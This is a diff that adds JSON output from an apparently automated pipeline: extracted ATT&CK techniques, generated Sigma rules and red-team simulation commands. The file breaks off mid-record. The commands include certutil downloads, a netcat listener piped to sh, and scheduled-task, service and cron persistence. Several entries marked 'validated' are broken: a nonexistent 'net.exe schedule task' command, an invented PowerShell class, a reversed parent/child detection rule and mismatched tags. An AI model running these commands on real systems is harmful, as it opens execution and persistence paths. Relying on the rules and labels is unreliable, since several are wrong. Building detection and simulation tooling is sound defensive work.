@@ -1,0 +1,1158 @@
+{
+  "status": "success",
+  "mode": "langchain",
+  "extraction": {
+    "status": "success",
+    "extraction_summary": {
+      "reports_processed": 1,
+      "total_ttps_extracted": 5,
+      "processing_time_ms": 0
+    },
+    "extraction_results": [
+      {
+        "report_id": "pdf-d6fafb2c0fec651cc531673842cd12c4",
+        "extracted_ttps": [
+          {
+            "ttp_id": "a4233d28-29b6-4ba5-9354-8d1dc61464a9",
+            "report_id": "pdf-d6fafb2c0fec651cc531673842cd12c4",
+            "technique_name": "Phishing",
+            "attack_id": "T1566",
+            "tactic": "Initial Access",
+            "description": "Detected Phishing activity via NLP pattern matching",
+            "confidence_score": 0.65,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.775,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.5,
+              "description_detail": 0.116,
+              "tool_mentions": 1.0,
+              "context_richness": 0.76,
+              "multiple_sources": 0.375
+            },
+            "indicators": [],
+            "tools": [
+              "net",
+              "apt",
+              "Sc",
+              "curl",
+              "reg",
+              "at"
+            ],
+            "extraction_method": "nlp_indicator",
+            "reasoning": null,
+            "quote": null
+          },
+          {
+            "ttp_id": "1ed11eed-ee8e-4f97-8361-9d466a203056",
+            "report_id": "pdf-d6fafb2c0fec651cc531673842cd12c4",
+            "technique_name": "Create or Modify System Process",
+            "attack_id": "T1543",
+            "tactic": "Persistence",
+            "description": "Detected Create or Modify System Process activity via NLP pattern matching",
+            "confidence_score": 0.637,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.775,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.5,
+              "description_detail": 0.246,
+              "tool_mentions": 1.0,
+              "context_richness": 0.54,
+              "multiple_sources": 0.375
+            },
+            "indicators": [],
+            "tools": [
+              "net",
+              "apt",
+              "Sc",
+              "curl",
+              "reg",
+              "at"
+            ],
+            "extraction_method": "nlp_indicator",
+            "reasoning": null,
+            "quote": null
+          },
+          {
+            "ttp_id": "2cd5bea7-44ac-4893-9d6e-06d4b20df1fd",
+            "report_id": "pdf-d6fafb2c0fec651cc531673842cd12c4",
+            "technique_name": "Application Layer Protocol",
+            "attack_id": "T1071",
+            "tactic": "Command And Control",
+            "description": "Detected Application Layer Protocol activity via NLP pattern matching",
+            "confidence_score": 0.63,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.775,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.5,
+              "description_detail": 0.199,
+              "tool_mentions": 1.0,
+              "context_richness": 0.54,
+              "multiple_sources": 0.375
+            },
+            "indicators": [],
+            "tools": [
+              "net",
+              "apt",
+              "Sc",
+              "curl",
+              "reg",
+              "at"
+            ],
+            "extraction_method": "nlp_indicator",
+            "reasoning": null,
+            "quote": null
+          },
+          {
+            "ttp_id": "4a05e8be-9daa-4815-a194-605cfe2df862",
+            "report_id": "pdf-d6fafb2c0fec651cc531673842cd12c4",
+            "technique_name": "Exfiltration Over C2 Channel",
+            "attack_id": "T1041",
+            "tactic": "Exfiltration",
+            "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
+            "confidence_score": 0.627,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.775,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.5,
+              "description_detail": 0.185,
+              "tool_mentions": 1.0,
+              "context_richness": 0.54,
+              "multiple_sources": 0.375
+            },
+            "indicators": [],
+            "tools": [
+              "net",
+              "apt",
+              "Sc",
+              "curl",
+              "reg",
+              "at"
+            ],
+            "extraction_method": "nlp_indicator",
+            "reasoning": null,
+            "quote": null
+          },
+          {
+            "ttp_id": "ab469707-04d4-4d3f-9f1b-8299199fb385",
+            "report_id": "pdf-d6fafb2c0fec651cc531673842cd12c4",
+            "technique_name": "Archive Collected Data",
+            "attack_id": "T1560",
+            "tactic": "Collection",
+            "description": "Detected Archive Collected Data activity via NLP pattern matching",
+            "confidence_score": 0.624,
+            "confidence_level": "medium",
+            "confidence_breakdown": {
+              "report_confidence": 0.775,
+              "attack_mapping": 0.95,
+              "ioc_evidence": 0.5,
+              "description_detail": 0.162,
+              "tool_mentions": 1.0,
+              "context_richness": 0.54,
+              "multiple_sources": 0.375
+            },
+            "indicators": [],
+            "tools": [
+              "net",
+              "apt",
+              "Sc",
+              "curl",
+              "reg",
+              "at"
+            ],
+            "extraction_method": "nlp_indicator",
+            "reasoning": null,
+            "quote": null
+          }
+        ]
+      }
+    ]
+  },
+  "rules": {
+    "rules": [
+      {
+        "title": "Phishing Detection via Suspicious Office Processes",
+        "description": "Detects phishing activities by identifying Office processes spawning command shells, indicative of malicious behavior.",
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "detection": {
+          "selection": {
+            "Image|endswith": "\\WINWORD.EXE",
+            "ParentImage|endswith": [
+              "\\cmd.exe",
+              "\\powershell.exe"
+            ]
+          },
+          "condition": "selection"
+        },
+        "falsepositives": [
+          "Legitimate use of Office applications for scripting or automation tasks.",
+          "Administrative tasks involving Office processes and command shells."
+        ],
+        "level": "high",
+        "tags": [
+          "attack.phishing"
+        ],
+        "ttp_id": "unknown",
+        "technique_name": "Phishing",
+        "generation_method": "langchain",
+        "id": "8c27b683-d5b3-496a-bc4e-c910bee03c87",
+        "siem_verification": {
+          "detected": true,
+          "status": "success",
+          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
+          "events_found": 56,
+          "query_time_ms": 692.0000000000001
+        }
+      },
+      {
+        "title": "Detect Create or Modify System Process via NLP Pattern Matching",
+        "description": "Detects suspicious process creation activities indicative of the 'Create or Modify System Process' technique using NLP pattern matching.",
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "detection": {
+          "selection": {
+            "Image|contains": "powershell.exe",
+            "CommandLine|contains": "Invoke-Expression"
+          },
+          "condition": "selection"
+        },
+        "falsepositives": [
+          "Administrative tasks using PowerShell for legitimate purposes",
+          "Scripted deployments using PowerShell"
+        ],
+        "level": "high",
+        "tags": [
+          "custom.attack",
+          "custom.persistence"
+        ],
+        "ttp_id": "unknown",
+        "technique_name": "Create or Modify System Process",
+        "generation_method": "langchain",
+        "id": "37c20493-1422-420a-9aa8-62ca19317499",
+        "siem_verification": {
+          "detected": true,
+          "status": "success",
+          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
+          "events_found": 12,
+          "query_time_ms": 748.0
+        }
+      },
+      {
+        "title": "Detect Suspicious Application Layer Protocol Activity",
+        "description": "Detects potential Command and Control activity by identifying suspicious application layer protocol usage patterns in process creation events.",
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "detection": {
+          "selection": {
+            "Image|endswith": "\\powershell.exe",
+            "CommandLine|contains": "-enc"
+          },
+          "condition": "selection"
+        },
+        "falsepositives": [
+          "Legitimate use of PowerShell for administrative tasks",
+          "Software updates using encoded commands"
+        ],
+        "level": "high",
+        "tags": [
+          "custom.attack"
+        ],
+        "ttp_id": "unknown",
+        "technique_name": "Application Layer Protocol",
+        "generation_method": "langchain",
+        "id": "972125b0-01e0-47fe-be3a-38c2d940c795",
+        "siem_verification": {
+          "detected": true,
+          "status": "success",
+          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
+          "events_found": 12,
+          "query_time_ms": 520.0
+        }
+      },
+      {
+        "title": "Detect Exfiltration Over C2 Channel via PowerShell or CMD",
+        "description": "Detects potential exfiltration activities over C2 channels by monitoring for PowerShell or CMD processes with suspicious command-line arguments indicative of data encoding or transfer.",
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "detection": {
+          "selection": {
+            "Image|endswith": "\\powershell.exe",
+            "CommandLine|contains": "Invoke-RestMethod"
+          },
+          "condition": "(selection and selection and selection and selection)"
+        },
+        "falsepositives": [
+          "Legitimate use of PowerShell or CMD for administrative tasks with similar command-line arguments.",
+          "Scripts that use encoding for benign purposes."
+        ],
+        "level": "high",
+        "tags": [
+          "attack.technique.t1204"
+        ],
+        "ttp_id": "unknown",
+        "technique_name": "Exfiltration Over C2 Channel",
+        "generation_method": "langchain",
+        "id": "b2ea8723-1b5f-43a0-bfe7-40a2a257904d",
+        "siem_verification": {
+          "detected": true,
+          "status": "success",
+          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
+          "events_found": 18,
+          "query_time_ms": 501.0
+        }
+      },
+      {
+        "title": "Detect Archive Collected Data via PowerShell",
+        "description": "Detects the use of PowerShell to archive collected data, indicative of the 'Archive Collected Data' technique under the MITRE ATT&CK Collection tactic.",
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "detection": {
+          "selection": {
+            "Image|endswith": "\\powershell.exe",
+            "CommandLine|contains": "Compress-Archive"
+          },
+          "condition": "selection"
+        },
+        "falsepositives": [
+          "Legitimate use of PowerShell for system administration tasks involving archiving.",
+          "Scheduled tasks that use PowerShell to archive logs or backups."
+        ],
+        "level": "medium",
+        "tags": [
+          "attack.collection"
+        ],
+        "ttp_id": "unknown",
+        "technique_name": "Archive Collected Data",
+        "generation_method": "langchain",
+        "id": "4ac8b54e-2440-4383-9c3e-0c9fd6137f7b",
+        "siem_verification": {
+          "detected": true,
+          "status": "success",
+          "message": "Verification complete",
+          "events_found": 2,
+          "query_time_ms": 625.0
+        }
+      }
+    ],
+    "status": "success"
+  },
+  "evaluation": {
+    "status": "success",
+    "summary": {
+      "average_quality_score": 0.75
+    }
+  },
+  "attacks": [
+    {
+      "id": "0d223a8a-71c4-4cea-97a6-2d54f2d720a7",
+      "ttp_id": "a4233d28-29b6-4ba5-9354-8d1dc61464a9",
+      "technique_id": "a4233d28-29b6-4ba5-9354-8d1dc61464a9",
+      "technique_name": "Phishing",
+      "tactic": "Initial Access",
+      "platform": "windows",
+      "command": "powershell -Command \"Start-Process cmd -ArgumentList '/c echo Fake Login > $env:TEMP\\fake_login.txt'\"",
+      "description": "Basic simulation of phishing by creating a fake login text file in the TEMP directory.",
+      "requires_admin": false,
+      "safety_level": "high",
+      "expected_behavior": "Creates a text file in the TEMP directory with a fake login message.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:19:52.288684",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.65,
+      "validated": true
+    },
+    {
+      "id": "8fa75ff3-cb53-42c9-b5bd-908f87d3a985",
+      "ttp_id": "a4233d28-29b6-4ba5-9354-8d1dc61464a9",
+      "technique_id": "a4233d28-29b6-4ba5-9354-8d1dc61464a9",
+      "technique_name": "Phishing",
+      "tactic": "Initial Access",
+      "platform": "windows",
+      "command": "powershell -Command \"Start-Process cmd -ArgumentList '/c certutil -urlcache -split -f http://example.com/fake_login.html $env:TEMP\\fake_login.html'\"",
+      "description": "Intermediate simulation using certutil to download a benign HTML file that mimics a phishing page.",
+      "requires_admin": false,
+      "safety_level": "high",
+      "expected_behavior": "Downloads a benign HTML file to the TEMP directory, simulating a phishing page.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:19:52.288684",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.65,
+      "validated": true
+    },
+    {
+      "id": "ec5fb7fa-db2b-44b8-ba01-959a2ff7e9aa",
+      "ttp_id": "a4233d28-29b6-4ba5-9354-8d1dc61464a9",
+      "technique_id": "a4233d28-29b6-4ba5-9354-8d1dc61464a9",
+      "technique_name": "Phishing",
+      "tactic": "Initial Access",
+      "platform": "windows",
+      "command": "powershell -Command \"Start-Process cmd -ArgumentList '/c powershell -Command \\\"$fakePrompt = New-Object System.Management.Automation.Host.Prompter\\\"; $fakePrompt.PromptForCredential('Fake Login', 'Enter your credentials:', 'fakeuser', 'fakepassword')\\\"'\"",
+      "description": "Advanced simulation using PowerShell to create a fake credential prompt.",
+      "requires_admin": false,
+      "safety_level": "high",
+      "expected_behavior": "Displays a fake credential prompt without collecting any actual data.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:19:52.288684",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.65,
+      "validated": true
+    },
+    {
+      "id": "10ea62d4-116f-4fec-a89f-695117d669d4",
+      "ttp_id": "a4233d28-29b6-4ba5-9354-8d1dc61464a9",
+      "technique_id": "a4233d28-29b6-4ba5-9354-8d1dc61464a9",
+      "technique_name": "Phishing",
+      "tactic": "Initial Access",
+      "platform": "linux",
+      "command": "echo 'Phishing simulation: Clicking this link might be harmful.' > $HOME/phishing_test.txt",
+      "description": "Basic simulation of a phishing email by creating a text file with a benign warning message.",
+      "requires_admin": false,
+      "safety_level": "high",
+      "expected_behavior": "A text file named 'phishing_test.txt' is created in the user's home directory containing a benign warning message.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:20:49.998896",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.65,
+      "validated": true
+    },
+    {
+      "id": "fd1ed33e-6057-479d-98da-24db2adff48b",
+      "ttp_id": "a4233d28-29b6-4ba5-9354-8d1dc61464a9",
+      "technique_id": "a4233d28-29b6-4ba5-9354-8d1dc61464a9",
+      "technique_name": "Phishing",
+      "tactic": "Initial Access",
+      "platform": "linux",
+      "command": "echo 'Simulated phishing link: https://example.com' | mail -s 'Phishing Test' user@example.com",
+      "description": "Intermediate simulation of a phishing email by sending a test email with a simulated phishing link.",
+      "requires_admin": false,
+      "safety_level": "high",
+      "expected_behavior": "An email is sent to 'user@example.com' with a subject 'Phishing Test' containing a simulated phishing link.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:20:49.998896",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.65,
+      "validated": true
+    },
+    {
+      "id": "54d8f26d-d97d-4e40-940a-8314b26a97cc",
+      "ttp_id": "a4233d28-29b6-4ba5-9354-8d1dc61464a9",
+      "technique_id": "a4233d28-29b6-4ba5-9354-8d1dc61464a9",
+      "technique_name": "Phishing",
+      "tactic": "Initial Access",
+      "platform": "linux",
+      "command": "powershell -Command \"Start-Process 'firefox' -ArgumentList 'https://example.com'\"",
+      "description": "Advanced simulation of a phishing attack by opening a web browser to a benign URL using PowerShell.",
+      "requires_admin": false,
+      "safety_level": "high",
+      "expected_behavior": "A web browser (Firefox) is launched and navigates to 'https://example.com'.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:20:49.998896",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.65,
+      "validated": true
+    },
+    {
+      "id": "b11146d1-4a6e-4540-93b8-319dcbbfebf3",
+      "ttp_id": "1ed11eed-ee8e-4f97-8361-9d466a203056",
+      "technique_id": "1ed11eed-ee8e-4f97-8361-9d466a203056",
+      "technique_name": "Create or Modify System Process",
+      "tactic": "Persistence",
+      "platform": "windows",
+      "command": "net.exe schedule task /create /tn \"TestTask\" /tr \"cmd.exe /c echo Test\" /sc onlogon /f",
+      "description": "Creates a scheduled task using net.exe to run a benign command at user logon.",
+      "requires_admin": true,
+      "safety_level": "medium",
+      "expected_behavior": "A scheduled task named 'TestTask' is created to execute 'cmd.exe /c echo Test' at user logon.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:17:47.532881",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.637,
+      "validated": true
+    },
+    {
+      "id": "707a262d-386e-475f-af15-c5afbe34f0eb",
+      "ttp_id": "1ed11eed-ee8e-4f97-8361-9d466a203056",
+      "technique_id": "1ed11eed-ee8e-4f97-8361-9d466a203056",
+      "technique_name": "Create or Modify System Process",
+      "tactic": "Persistence",
+      "platform": "windows",
+      "command": "sc.exe create TestService binPath= \"cmd.exe /c echo Test Service\" start= auto",
+      "description": "Creates a service using sc.exe that runs a benign command.",
+      "requires_admin": true,
+      "safety_level": "medium",
+      "expected_behavior": "A service named 'TestService' is created to run 'cmd.exe /c echo Test Service' on start.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:17:47.532881",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.637,
+      "validated": true
+    },
+    {
+      "id": "d88caa29-0238-4544-99cd-0b0976c361cf",
+      "ttp_id": "1ed11eed-ee8e-4f97-8361-9d466a203056",
+      "technique_id": "1ed11eed-ee8e-4f97-8361-9d466a203056",
+      "technique_name": "Create or Modify System Process",
+      "tactic": "Persistence",
+      "platform": "windows",
+      "command": "powershell -Command \"New-ScheduledTaskAction -Execute 'powershell' -Argument '-EncodedCommand UGFzc3dvcmQ='; New-ScheduledTaskTrigger -AtLogon; Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'powershell' -Argument '-EncodedCommand UGFzc3dvcmQ=') -Trigger (New-ScheduledTaskTrigger -AtLogon) -TaskName 'EncodedTask' -Description 'Test Task'\"",
+      "description": "Creates a scheduled task using PowerShell with an encoded command to run a benign string.",
+      "requires_admin": true,
+      "safety_level": "medium",
+      "expected_behavior": "A scheduled task named 'EncodedTask' is created to execute an encoded PowerShell command at user logon.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:17:47.532881",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.637,
+      "validated": true
+    },
+    {
+      "id": "738aaa1a-1a02-46c4-96db-396139e9abb3",
+      "ttp_id": "1ed11eed-ee8e-4f97-8361-9d466a203056",
+      "technique_id": "1ed11eed-ee8e-4f97-8361-9d466a203056",
+      "technique_name": "Create or Modify System Process",
+      "tactic": "Persistence",
+      "platform": "linux",
+      "command": "echo 'echo Hello, World!' > $HOME/bin/startup.sh && chmod +x $HOME/bin/startup.sh && crontab -l | { cat; echo '@reboot $HOME/bin/startup.sh'; } | crontab -",
+      "description": "This command creates a startup script that prints a message and schedules it to run at reboot using cron.",
+      "requires_admin": false,
+      "safety_level": "high",
+      "expected_behavior": "The script will print 'Hello, World!' every time the system reboots.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:18:38.574508",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.637,
+      "validated": true
+    },
+    {
+      "id": "8b428562-3a1f-4d93-b671-6fb4d7530536",
+      "ttp_id": "1ed11eed-ee8e-4f97-8361-9d466a203056",
+      "technique_id": "1ed11eed-ee8e-4f97-8361-9d466a203056",
+      "technique_name": "Create or Modify System Process",
+      "tactic": "Persistence",
+      "platform": "linux",
+      "command": "echo '#!/bin/bash\necho Custom startup message' > $HOME/bin/startup.bash && chmod +x $HOME/bin/startup.bash && (crontab -l 2>/dev/null; echo '@reboot $HOME/bin/startup.bash') | crontab -",
+      "description": "This command creates a bash script and schedules it to run at system startup using cron.",
+      "requires_admin": false,
+      "safety_level": "high",
+      "expected_behavior": "The script will print 'Custom startup message' every time the system reboots.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:18:38.574508",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.637,
+      "validated": true
+    },
+    {
+      "id": "956a5958-2aa9-4563-968d-1d3c8a83a8c6",
+      "ttp_id": "1ed11eed-ee8e-4f97-8361-9d466a203056",
+      "technique_id": "1ed11eed-ee8e-4f97-8361-9d466a203056",
+      "technique_name": "Create or Modify System Process",
+      "tactic": "Persistence",
+      "platform": "linux",
+      "command": "echo '#!/bin/bash\necho Advanced startup task' > $HOME/bin/advanced_startup.sh && chmod +x $HOME/bin/advanced_startup.sh && (crontab -l 2>/dev/null; echo '@reboot sleep 10 && $HOME/bin/advanced_startup.sh') | crontab -",
+      "description": "This command creates an advanced startup script with a delay and schedules it to run at system startup using cron.",
+      "requires_admin": false,
+      "safety_level": "high",
+      "expected_behavior": "The script will print 'Advanced startup task' 10 seconds after the system reboots.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:18:38.574508",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.637,
+      "validated": true
+    },
+    {
+      "id": "0b7555be-db3d-437a-8049-9e1dcc958ad0",
+      "ttp_id": "2cd5bea7-44ac-4893-9d6e-06d4b20df1fd",
+      "technique_id": "2cd5bea7-44ac-4893-9d6e-06d4b20df1fd",
+      "technique_name": "Application Layer Protocol",
+      "tactic": "Command And Control",
+      "platform": "windows",
+      "command": "netstat -an | findstr LISTENING > $env:TEMP\\netstat_output.txt",
+      "description": "Basic command to list all listening ports and save the output to a temporary file.",
+      "requires_admin": false,
+      "safety_level": "high",
+      "expected_behavior": "Outputs a list of all currently listening ports to a text file in the temporary directory.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:17:33.822293",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.63,
+      "validated": true
+    },
+    {
+      "id": "be617dbd-afaf-4f22-bf4d-f7d0c14cea67",
+      "ttp_id": "2cd5bea7-44ac-4893-9d6e-06d4b20df1fd",
+      "technique_id": "2cd5bea7-44ac-4893-9d6e-06d4b20df1fd",
+      "technique_name": "Application Layer Protocol",
+      "tactic": "Command And Control",
+      "platform": "windows",
+      "command": "powershell -Command \"Start-Process -FilePath cmd -ArgumentList '/c echo Listening on ports: && netstat -an | findstr LISTENING'\"",
+      "description": "Intermediate command using PowerShell to start a command prompt process that lists listening ports.",
+      "requires_admin": false,
+      "safety_level": "high",
+      "expected_behavior": "Opens a command prompt window displaying all listening ports.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:17:33.822293",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.63,
+      "validated": true
+    },
+    {
+      "id": "346aca74-f75f-446a-aa54-6fc27caecb83",
+      "ttp_id": "2cd5bea7-44ac-4893-9d6e-06d4b20df1fd",
+      "technique_id": "2cd5bea7-44ac-4893-9d6e-06d4b20df1fd",
+      "technique_name": "Application Layer Protocol",
+      "tactic": "Command And Control",
+      "platform": "windows",
+      "command": "certutil -urlcache -split -f http://example.com/test.txt $env:TEMP\\test.txt",
+      "description": "Advanced command using certutil to fetch a file from a URL and save it to a temporary location.",
+      "requires_admin": false,
+      "safety_level": "medium",
+      "expected_behavior": "Downloads a test file from a specified URL and saves it to the temporary directory. Note: Requires internet access for real execution.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:17:33.822293",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.63,
+      "validated": true
+    },
+    {
+      "id": "9d281e55-413f-4586-a2e3-6a3af15dd36a",
+      "ttp_id": "2cd5bea7-44ac-4893-9d6e-06d4b20df1fd",
+      "technique_id": "2cd5bea7-44ac-4893-9d6e-06d4b20df1fd",
+      "technique_name": "Application Layer Protocol",
+      "tactic": "Command And Control",
+      "platform": "linux",
+      "command": "nc -zv example.com 80",
+      "description": "Basic command using netcat to check connectivity to a server on port 80.",
+      "requires_admin": false,
+      "safety_level": "high",
+      "expected_behavior": "Netcat attempts to connect to example.com on port 80, displaying connection status.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:18:14.357830",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.63,
+      "validated": true
+    },
+    {
+      "id": "77e7d55c-73b8-4f6f-9f29-fe39d75f6c93",
+      "ttp_id": "2cd5bea7-44ac-4893-9d6e-06d4b20df1fd",
+      "technique_id": "2cd5bea7-44ac-4893-9d6e-06d4b20df1fd",
+      "technique_name": "Application Layer Protocol",
+      "tactic": "Command And Control",
+      "platform": "linux",
+      "command": "curl -s http://example.com",
+      "description": "Intermediate command using curl to fetch content from a benign URL.",
+      "requires_admin": false,
+      "safety_level": "high",
+      "expected_behavior": "Curl silently fetches content from example.com, displaying no output if successful.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:18:14.357830",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.63,
+      "validated": true
+    },
+    {
+      "id": "47651180-7059-4301-87fb-42bf2a57397c",
+      "ttp_id": "2cd5bea7-44ac-4893-9d6e-06d4b20df1fd",
+      "technique_id": "2cd5bea7-44ac-4893-9d6e-06d4b20df1fd",
+      "technique_name": "Application Layer Protocol",
+      "tactic": "Command And Control",
+      "platform": "linux",
+      "command": "nc -lvp 4444 | sh & curl -s http://example.com | nc -w 3 localhost 4444",
+      "description": "Advanced command combining netcat and curl to simulate a command and control interaction.",
+      "requires_admin": false,
+      "safety_level": "medium",
+      "expected_behavior": "Netcat listens on port 4444, curl fetches content from example.com, and pipes it to the listening netcat instance.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:18:14.357830",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.63,
+      "validated": true
+    },
+    {
+      "id": "c0350371-421a-4508-b00b-d72b6887ada6",
+      "ttp_id": "4a05e8be-9daa-4815-a194-605cfe2df862",
+      "technique_id": "4a05e8be-9daa-4815-a194-605cfe2df862",
+      "technique_name": "Exfiltration Over C2 Channel",
+      "tactic": "Exfiltration",
+      "platform": "windows",
+      "command": "powershell -Command \"$data = 'test data'; $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data)); echo $encoded > %TEMP%\\exfiltration.txt\"",
+      "description": "Basic command to encode a string and save it to a local file, simulating data exfiltration.",
+      "requires_admin": false,
+      "safety_level": "high",
+      "expected_behavior": "The command encodes 'test data' into Base64 and saves it to a file in the %TEMP% directory.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:17:51.413140",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.627,
+      "validated": true
+    },
+    {
+      "id": "5a2b9f88-53c3-4770-ae84-196d051172f9",
+      "ttp_id": "4a05e8be-9daa-4815-a194-605cfe2df862",
+      "technique_id": "4a05e8be-9daa-4815-a194-605cfe2df862",
+      "technique_name": "Exfiltration Over C2 Channel",
+      "tactic": "Exfiltration",
+      "platform": "windows",
+      "command": "powershell -Command \"$data = Get-Content -Path %TEMP%\\exfiltration.txt; $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data)); echo $encoded > %TEMP%\\exfiltration2.txt\"",
+      "description": "Intermediate command that reads from a file, encodes the content, and writes it to another file, simulating a multi-step data exfiltration process.",
+      "requires_admin": false,
+      "safety_level": "high",
+      "expected_behavior": "The command reads data from 'exfiltration.txt', encodes it, and saves it to 'exfiltration2.txt' in the %TEMP% directory.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:17:51.413140",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.627,
+      "validated": true
+    },
+    {
+      "id": "906d4da0-d4db-46f3-8ada-558bc00b2bce",
+      "ttp_id": "4a05e8be-9daa-4815-a194-605cfe2df862",
+      "technique_id": "4a05e8be-9daa-4815-a194-605cfe2df862",
+      "technique_name": "Exfiltration Over C2 Channel",
+      "tactic": "Exfiltration",
+      "platform": "windows",
+      "command": "powershell -Command \"$data = Get-Content -Path %TEMP%\\exfiltration2.txt; $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data)); $bytes = [Convert]::FromBase64String($encoded); [System.IO.File]::WriteAllBytes('%TEMP%\\exfiltration3.bin', $bytes)\"",
+      "description": "Advanced command that reads encoded data, decodes it, and writes the binary data to a file, simulating a more complex exfiltration process.",
+      "requires_admin": false,
+      "safety_level": "medium",
+      "expected_behavior": "The command reads Base64 encoded data from 'exfiltration2.txt', decodes it, and writes the binary data to 'exfiltration3.bin' in the %TEMP% directory.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:17:51.414307",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.627,
+      "validated": true
+    },
+    {
+      "id": "51c8d505-761a-4679-8633-e6c075054483",
+      "ttp_id": "4a05e8be-9daa-4815-a194-605cfe2df862",
+      "technique_id": "4a05e8be-9daa-4815-a194-605cfe2df862",
+      "technique_name": "Exfiltration Over C2 Channel",
+      "tactic": "Exfiltration",
+      "platform": "linux",
+      "command": "echo 'test data' | nc -l 12345 > /dev/null & nc -w 3 localhost 12345 < /dev/null",
+      "description": "Basic local exfiltration simulation using netcat to listen and send data on localhost.",
+      "requires_admin": false,
+      "safety_level": "high",
+      "expected_behavior": "This command sets up a local listener and sender using netcat, simulating data exfiltration over a C2 channel without actual network transmission.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:19:04.157446",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.627,
+      "validated": true
+    },
+    {
+      "id": "7b663752-57ea-4070-8e8b-01771acb5ae4",
+      "ttp_id": "4a05e8be-9daa-4815-a194-605cfe2df862",
+      "technique_id": "4a05e8be-9daa-4815-a194-605cfe2df862",
+      "technique_name": "Exfiltration Over C2 Channel",
+      "tactic": "Exfiltration",
+      "platform": "linux",
+      "command": "echo 'test data' | socat TCP-LISTEN:12345,reuseaddr,fork EXEC:cat > /dev/null & socat TCP:localhost:12345 EXEC:cat < /dev/null",
+      "description": "Intermediate exfiltration simulation using socat for listening and sending data on localhost.",
+      "requires_admin": false,
+      "safety_level": "high",
+      "expected_behavior": "This command uses socat to create a local TCP listener and sender, simulating data exfiltration over a C2 channel without actual network transmission.",
+      "source": "langchain",
